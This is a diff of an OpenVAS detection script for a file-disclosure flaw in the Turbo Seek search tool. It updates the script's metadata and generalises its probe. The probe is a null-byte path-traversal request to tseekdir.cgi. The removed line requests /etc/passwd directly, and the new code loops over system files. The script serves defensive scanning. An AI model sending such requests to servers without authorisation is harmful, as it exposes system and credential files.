@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: turboseek_read_file.nasl 6056 2017-05-02 09:02:50Z teissa $
+# $Id: turboseek_read_file.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # Turbo Seek files reading
 #
@@ -30,8 +30,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.14719");
-  script_version("$Revision: 6056 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(11163);
   script_tag(name:"cvss_base", value:"5.0");
@@ -40,23 +40,20 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2004 David Maciejak");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_require_keys("Host/runs_unixoide");
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  tag_summary = "The remote host is running Turbo Seek.
+  script_tag(name:"solution", value:"Upgrade at least to version 1.7.2 of this software");
+  script_tag(name:"summary", value:"The remote host is running Turbo Seek.
 
   Turbo Seek is a search engine and directory tool.
 
   The remote version of this software  contains a file content disclosure
   flaw which may allow a malicious user to read arbitrary files on the remote
   server with the privileges the remote web server is running with (usually
-  root or nobody).";
-
-  tag_solution = "Upgrade at least to version 1.7.2 of this software";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  root or nobody).");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -66,18 +63,27 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
+
+files = traversal_files("linux");
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string( dir, "/cgi/tseekdir.cgi?location=/etc/passwd%00" );
 
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+  foreach pattern( keys ( files ) ) {
+
+    file = files[pattern];
+
+    url = string( dir, "/cgi/tseekdir.cgi?location=/" + file + "%00" );
+
+    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
